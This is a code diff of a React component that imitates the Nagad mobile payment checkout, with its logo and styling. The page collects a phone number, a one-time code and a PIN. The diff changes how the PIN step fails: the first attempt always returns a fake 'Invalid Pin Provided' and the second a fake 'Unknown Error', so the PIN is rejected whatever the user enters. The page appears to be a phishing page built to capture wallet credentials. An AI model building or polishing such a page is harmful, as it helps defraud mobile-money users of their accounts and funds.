@@ -8,13 +8,12 @@ const NagadPayment = () => {
   const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
   const [showOtpView, setShowOtpView] = useState(false);
   const [showPinView, setShowPinView] = useState(false);
-  const [showErrorView, setShowErrorView] = useState(false);
   const [otpValue, setOtpValue] = useState("");
   const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(""));
-  const [redirectTimer, setRedirectTimer] = useState(5);
   const [language, setLanguage] = useState<'bn' | 'en'>('en');
   const [phoneError, setPhoneError] = useState("");
   const [pinError, setPinError] = useState("");
+  const [pinAttempts, setPinAttempts] = useState(0);
   const [otpResent, setOtpResent] = useState(false);
 
   const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
@@ -22,14 +21,12 @@ const NagadPayment = () => {
   const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   useEffect(() => {
-    if (!showErrorView) {
-      setTimeout(() => {
-        if (showPinView) pinInputRefs.current[0]?.focus();
-        else if (showOtpView) otpInputRef.current?.focus();
-        else phoneInputRefs.current[0]?.focus();
-      }, 100);
-    }
-  }, [showOtpView, showPinView, showErrorView]);
+    setTimeout(() => {
+      if (showPinView) pinInputRefs.current[0]?.focus();
+      else if (showOtpView) otpInputRef.current?.focus();
+      else phoneInputRefs.current[0]?.focus();
+    }, 100);
+  }, [showOtpView, showPinView]);
 
   const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
   const getPhoneNumber = () => phoneDigits.join("");
@@ -38,15 +35,6 @@ const NagadPayment = () => {
     return phone.length === 11 && validPrefixes.includes(phone.substring(0, 3)) && /^\d+$/.test(phone);
   };
   const isValidOtp = () => otpValue.length === 6 && /^\d+$/.test(otpValue);
-
-  useEffect(() => {
-    let interval: NodeJS.Timeout;
-    if (showErrorView && redirectTimer > 0) {
-      interval = setInterval(() => setRedirectTimer((prev) => prev - 1), 1000);
-    }
-    if (showErrorView && redirectTimer === 0) navigate("/");
-    return () => clearInterval(interval);
-  }, [showErrorView, redirectTimer, navigate]);
 
   const handleDigitChange = (
     index: number, value: string, digits: string[],
@@ -72,15 +60,14 @@ const NagadPayment = () => {
     if (isValidNumber()) { setPhoneError(""); setShowOtpView(true); }
     else setPhoneError("Invalid mobile number");
   };
-  const handleOtpConfirm = () => { if (isValidOtp()) { setShowOtpView(false); setShowPinView(true); setPinError(""); } };
+  const handleOtpConfirm = () => { if (isValidOtp()) { setShowOtpView(false); setShowPinView(true); setPinError(""); setPinAttempts(0); } };
   const handlePinConfirm = () => {
-    // Always show "Invalid Pin Provided" first, then on second click show error view
-    if (!pinError) {
+    if (pinAttempts === 0) {
       setPinError("Invalid Pin Provided");
+      setPinAttempts(1);
     } else {
-      setShowPinView(false);
-      setShowErrorView(true);
-      setRedirectTimer(5);
+      setPinError("Unknown Error. Please call 16167 for more information.");
+      setPinAttempts(2);
     }
   };
   const handleResendOtp = () => {
@@ -132,39 +119,6 @@ const NagadPayment = () => {
     <div className="min-h-screen flex flex-col items-center justify-center bg-gray-300 p-0">
       <div className="w-full h-screen flex flex-col overflow-hidden border-[8px] border-black"
         style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
-      {showErrorView ? (
-        <div className="flex-1 flex flex-col">
-          {/* Language Toggle */}
-          <div className="flex justify-end p-2">
-            <div className="flex overflow-hidden border border-white/50 rounded-sm">
-              <button onClick={() => setLanguage('bn')}
-                className={`px-2 py-0.5 text-[10px] font-bold transition-colors ${language === 'bn' ? 'bg-white/25 text-white' : 'text-white/70'}`}>বাং</button>
-              <button onClick={() => setLanguage('en')}
-                className={`px-2 py-0.5 text-[10px] font-bold transition-colors ${language === 'en' ? 'bg-white/25 text-white' : 'text-white/70'}`}>Eng</button>
-            </div>
-          </div>
-
-          {/* Cart Icon & Title */}
-          <div className="flex flex-col items-center pt-1 pb-2">
-            <img src={cartIcon} alt="Cart" className="w-14 h-14 mb-1 object-contain" />
-            <h1 className="text-[#ccc] text-base font-bold">Easy Payment System</h1>
-          </div>
-
-          {/* Error Message - centered */}
-          <div className="flex-1 flex items-center justify-center px-8">
-            <div className="text-center">
-              <p className="text-yellow-300 text-sm font-bold mb-1">Unknown Error.</p>
-              <p className="text-yellow-300 text-sm font-bold">Please call 16167 for more information.</p>
-              <p className="text-[#ccc] text-xs font-bold mt-4">Redirecting to Merchant Website in {redirectTimer}s</p>
-            </div>
-          </div>
-
-          {/* White Nagad Logo Footer */}
-          <div className="flex justify-center pb-4">
-            <img src={nagadLogoWhite} alt="Nagad" className="h-10 object-contain" />
-          </div>
-        </div>
-      ) : (
         <div className="flex-1 flex flex-col">
           {/* Language Toggle */}
           <div className="flex justify-end p-2">
@@ -206,9 +160,9 @@ const NagadPayment = () => {
               <div className="flex flex-col items-center">
                 <p className="text-[#ccc] text-center text-sm font-bold mb-3">Enter PIN</p>
                 {renderPinInputs()}
-                {pinError && (
-                  <p className="text-yellow-300 text-xs font-bold mt-2">{pinError}</p>
-                )}
+                <p className={`text-yellow-300 text-xs font-bold mt-2 text-center ${pinError ? 'visible' : 'invisible'}`}>
+                  {pinError || "placeholder"}
+                </p>
               </div>
             ) : showOtpView ? (
               <div className="flex flex-col items-center w-full">
@@ -244,15 +198,15 @@ const NagadPayment = () => {
             <div className="flex gap-8 justify-center mt-4">
               <button
                 onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
-                className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+                className="px-6 bg-white text-[#C41E3A] py-1 rounded text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
               >Proceed</button>
               {showOtpView && (
                 <button onClick={handleResendOtp}
-                  className="px-6 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+                  className="px-4 bg-white text-[#C41E3A] py-1 rounded text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
                 >Resend Code</button>
               )}
               <button onClick={handleClose}
-                className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+                className="px-6 bg-white text-[#C41E3A] py-1 rounded text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
               >Close</button>
             </div>
           </div>
@@ -262,7 +216,6 @@ const NagadPayment = () => {
             <img src={nagadLogoWhite} alt="Nagad" className="h-10 object-contain" />
           </div>
         </div>
-      )}
       </div>
     </div>
   );
